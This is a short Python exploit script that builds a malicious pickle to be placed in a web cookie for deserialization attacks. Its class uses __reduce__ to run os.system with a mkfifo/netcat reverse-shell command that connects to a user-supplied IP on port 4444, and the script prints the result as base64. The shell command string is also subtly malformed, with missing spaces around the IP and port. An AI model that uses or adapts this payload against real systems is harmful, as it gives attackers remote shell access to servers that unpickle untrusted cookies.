###################REPLACING Encoded PAYLOAD in a Cookie####################

import pickle
import sys
import base64
import re

#To allow Both Python2 and 3 reading the input
sys.stdout.write("Enter Target IP => ")
sys.stdout.flush()
ip = sys.stdin.readline()
print("you entered: " + ip)

#Regex IP Format
if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
    print('Invalid IP format')


command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat' + str(ip) + '4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))